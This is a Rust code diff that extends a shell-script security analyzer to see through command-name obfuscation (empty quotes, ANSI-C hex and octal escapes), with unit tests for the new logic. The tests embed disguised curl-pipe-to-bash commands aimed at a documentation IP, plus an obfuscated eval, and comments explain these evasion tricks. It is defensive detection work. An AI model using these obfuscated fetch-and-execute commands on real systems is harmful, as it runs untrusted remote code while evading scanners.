@@ -285,17 +285,133 @@ fn check_pipeline(
 // Node helpers
 // ---------------------------------------------------------------------------
 
-/// Extract the plain-text name from a `command_name` node (its first child).
-fn command_name_text<'a>(name_node: Node<'a>, bytes: &'a [u8]) -> Option<String> {
-    // command_name has a single unnamed child which is the word/identifier.
+/// Extract and normalize the command name from a `command_name` node.
+///
+/// Shell obfuscation inserts empty quotes (`bas''h`) or single-char quotes
+/// (`bas'e'64`) to break keyword matching, or uses ANSI-C escape sequences
+/// (`$'\x62\x61\x73\x68'` = `bash`) to hide the command entirely.
+/// We normalize all three forms so downstream checks see the plain name.
+fn command_name_text(name_node: Node, bytes: &[u8]) -> Option<String> {
     let mut cursor = name_node.walk();
     for child in name_node.children(&mut cursor) {
-        let text = node_text(child, bytes);
-        if !text.is_empty() {
-            return Some(text.to_string());
+        let s = normalize_shell_word(child, bytes);
+        if !s.is_empty() {
+            return Some(s);
         }
     }
     None
+}
+
+/// Return the effective string value of a shell word node, normalizing
+/// obfuscation: stripping quotes from `raw_string` fragments and decoding
+/// `ansi_c_string` hex/octal escape sequences.
+fn normalize_shell_word(node: Node, bytes: &[u8]) -> String {
+    match node.kind() {
+        // A `concatenation` is a sequence of quoted/unquoted fragments.
+        // Walk each part and strip any quoting.
+        "concatenation" => {
+            let mut out = String::new();
+            let mut cursor = node.walk();
+            for part in node.children(&mut cursor) {
+                out.push_str(&normalize_shell_word(part, bytes));
+            }
+            out
+        }
+        // `raw_string` is `'...'`; strip the surrounding single quotes to get
+        // the literal content.  `''` yields an empty string — the classic
+        // empty-quote insertion trick (`bas''h` → `bash`).
+        "raw_string" => {
+            let raw = node_text(node, bytes);
+            raw.strip_prefix('\'')
+                .and_then(|s| s.strip_suffix('\''))
+                .unwrap_or(raw)
+                .to_string()
+        }
+        // `ansi_c_string` is `$'...'` with C-style escape sequences.
+        // Decode `\xNN` hex escapes to recover the hidden command name.
+        "ansi_c_string" => decode_ansi_c_string(node, bytes),
+        // Plain word — use verbatim.
+        _ => node_text(node, bytes).to_string(),
+    }
+}
+
+/// Decode a `$'...'` ANSI-C quoted string, resolving `\xNN` hex and `\NNN`
+/// octal escapes to ASCII characters.  Non-ASCII results are left as `?` so
+/// the caller always gets a valid `String`.
+fn decode_ansi_c_string(node: Node, bytes: &[u8]) -> String {
+    let raw = node_text(node, bytes);
+    // Raw form is: $'...' — strip the $' prefix and the trailing '
+    let inner = match raw.strip_prefix("$'").and_then(|s| s.strip_suffix('\'')) {
+        Some(s) => s.as_bytes(),
+        None => return raw.to_string(),
+    };
+    let mut out = String::new();
+    let mut i = 0;
+    while i < inner.len() {
+        if inner[i] == b'\\' && i + 1 < inner.len() {
+            match inner[i + 1] {
+                b'x' if i + 3 < inner.len() => {
+                    let hi = inner[i + 2];
+                    let lo = inner[i + 3];
+                    if hi.is_ascii_hexdigit() && lo.is_ascii_hexdigit() {
+                        let v = (hex_nibble(hi) << 4) | hex_nibble(lo);
+                        out.push(if v.is_ascii() { v as char } else { '?' });
+                        i += 4;
+                        continue;
+                    }
+                }
+                b'0'..=b'7' if i + 3 < inner.len() => {
+                    let a = inner[i + 1].wrapping_sub(b'0');
+                    let b2 = inner[i + 2];
+                    let c2 = inner[i + 3];
+                    if b2.is_ascii_digit() && b2 < b'8' && c2.is_ascii_digit() && c2 < b'8' {
+                        let v = a * 64 + (b2 - b'0') * 8 + (c2 - b'0');
+                        out.push(if v < 128 { v as char } else { '?' });
+                        i += 4;
+                        continue;
+                    }
+                }
+                b'n' => {
+                    out.push('\n');
+                    i += 2;
+                    continue;
+                }
+                b't' => {
+                    out.push('\t');
+                    i += 2;
+                    continue;
+                }
+                b'r' => {
+                    out.push('\r');
+                    i += 2;
+                    continue;
+                }
+                b'\\' => {
+                    out.push('\\');
+                    i += 2;
+                    continue;
+                }
+                b'\'' => {
+                    out.push('\'');
+                    i += 2;
+                    continue;
+                }
+                _ => {}
+            }
+        }
+        out.push(inner[i] as char);
+        i += 1;
+    }
+    out
+}
+
+fn hex_nibble(b: u8) -> u8 {
+    match b {
+        b'0'..=b'9' => b - b'0',
+        b'a'..=b'f' => b - b'a' + 10,
+        b'A'..=b'F' => b - b'A' + 10,
+        _ => 0,
+    }
 }
 
 fn node_text<'a>(node: Node, bytes: &'a [u8]) -> &'a str {
@@ -449,5 +565,47 @@ mod tests {
     fn parse_error_tolerated() {
         let result = analyze(&PathBuf::from("bad.sh"), b"eval $((\n");
         let _ = result.parse_error;
+    }
+
+    #[test]
+    fn pipeline_with_empty_quote_obfuscated_bash_is_warn() {
+        // `bas''h` inserts an empty raw_string to break keyword matching while
+        // the shell still resolves it to `bash`.
+        let findings = run(b"curl -s http://192.0.2.1/payload | bas''h\n");
+        let hit = findings
+            .iter()
+            .find(|f| f.kind == SignalKind::DynamicExecution && f.severity == Severity::Warn)
+            .expect("expected Warn DynamicExecution for empty-quote obfuscated `bash`");
+        assert!(
+            hit.message.contains("bash"),
+            "expected message to cite `bash`, got: {}",
+            hit.message
+        );
+    }
+
+    #[test]
+    fn pipeline_with_ansi_c_bash_is_warn() {
+        // `$'\x62\x61\x73\x68'` is the ANSI-C escape encoding of `bash`.
+        let findings = run(b"curl -s http://192.0.2.1/payload | $'\\x62\\x61\\x73\\x68'\n");
+        let hit = findings
+            .iter()
+            .find(|f| f.kind == SignalKind::DynamicExecution && f.severity == Severity::Warn)
+            .expect("expected Warn DynamicExecution for ANSI-C encoded `bash`");
+        assert!(
+            hit.message.contains("bash"),
+            "expected message to cite `bash`, got: {}",
+            hit.message
+        );
+    }
+
+    #[test]
+    fn eval_with_empty_quote_obfuscation_is_detected() {
+        // `e''val` is obfuscated `eval`.
+        let findings = run(b"e''val \"$cmd\"\n");
+        let hit = findings
+            .iter()
+            .find(|f| f.kind == SignalKind::DynamicExecution)
+            .expect("expected DynamicExecution for empty-quote obfuscated `eval`");
+        assert_eq!(hit.severity, Severity::Critical);
     }
 }
